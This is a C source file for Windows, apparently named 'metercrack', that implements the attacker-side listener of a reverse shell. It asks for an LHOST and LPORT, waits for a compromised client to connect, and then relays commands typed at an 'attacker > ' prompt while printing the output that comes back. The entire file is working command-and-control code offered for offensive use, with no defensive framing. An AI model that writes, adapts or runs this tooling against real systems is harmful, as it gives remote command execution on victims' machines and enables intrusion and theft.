#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>

#define MAX_COMMAND_LENGTH 1024

// Banner Function
void print_banner() {
    printf(" _                               _    \n");
    printf(" _ __ ___   ___| |_ ___ _ __ ___ _ __ __ _  ___| | __\n");
    printf("| '_ ` _ \\ / _ \\ __/ _ \\ '__/ __| '__/ _` |/ __| |/ /\n");
    printf("| | | | | |  __/ ||  __/ | | (__| | | (_| | (__|   < \n");
    printf("|_| |_| |_|\\___|\\__\\___|_|  \\___|_|  \\__,_|\\___|_\\_\\\n");
    printf("\n");
}

// Function to initialize Winsock
void init_winsock() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("WSAStartup failed with error: %d\n", WSAGetLastError());
        exit(1);
    }
}

// Function to clean up Winsock
void cleanup_winsock() {
    WSACleanup();
}

// Function to start the listener
void listener(const char *LHOST, int LPORT) {
    SOCKET server_socket, client_socket;
    struct sockaddr_in server_addr, client_addr;
    char buffer[MAX_COMMAND_LENGTH];
    int addr_size = sizeof(client_addr);
    int bytes_received;

    // Create server socket
    server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket == INVALID_SOCKET) {
        printf("Socket creation failed with error: %d\n", WSAGetLastError());
        cleanup_winsock();
        exit(1);
    }

    // Set up server address
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(LPORT);
    server_addr.sin_addr.s_addr = inet_addr(LHOST);

    // Bind socket to the IP and port
    if (bind(server_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        printf("Bind failed with error: %d\n", WSAGetLastError());
        cleanup_winsock();
        exit(1);
    }

    // Listen for incoming connections
    if (listen(server_socket, 1) == SOCKET_ERROR) {
        printf("Listen failed with error: %d\n", WSAGetLastError());
        cleanup_winsock();
        exit(1);
    }

    printf("Listening on %s:%d...\n", LHOST, LPORT);

    // Accept client connection
    client_socket = accept(server_socket, (struct sockaddr *)&client_addr, &addr_size);
    if (client_socket == INVALID_SOCKET) {
        printf("Accept failed with error: %d\n", WSAGetLastError());
        cleanup_winsock();
        exit(1);
    }

    printf("Client connected\n");

    // Command loop
    while (1) {
        // Prompt for input
        printf("attacker > ");
        if (fgets(buffer, MAX_COMMAND_LENGTH, stdin) == NULL) {
            printf("Error reading input. Exiting...\n");
            break;
        }

        // Remove trailing newline character from input
        buffer[strcspn(buffer, "\n")] = '\0';

        // Exit condition
        if (strncmp(buffer, "exit", 4) == 0) {
            printf("Exiting listener...\n");
            break;
        }

        // Send command to client
        if (send(client_socket, buffer, strlen(buffer), 0) == SOCKET_ERROR) {
            printf("Failed to send command. Connection may be closed.\n");
            break;
        }

        // Receive response from client
        bytes_received = recv(client_socket, buffer, MAX_COMMAND_LENGTH - 1, 0);
        if (bytes_received <= 0) {
            printf("Client disconnected or error occurred.\n");
            break;
        }

        buffer[bytes_received] = '\0'; // Null-terminate response
        printf("%s", buffer);          // Print client response
    }

    // Close sockets
    closesocket(client_socket);
    closesocket(server_socket);
    cleanup_winsock();
}

int main() {
    char LHOST[16];
    int LPORT;

    // Print banner
    print_banner();

    // Get LHOST and LPORT from user
    printf("Enter LHOST (IP address): ");
    scanf("%15s", LHOST);
    printf("Enter LPORT (Port number): ");
    scanf("%d", &LPORT);

    // Initialize Winsock
    init_winsock();

    // Start the listener
    listener(LHOST, LPORT);

    return 0;
}
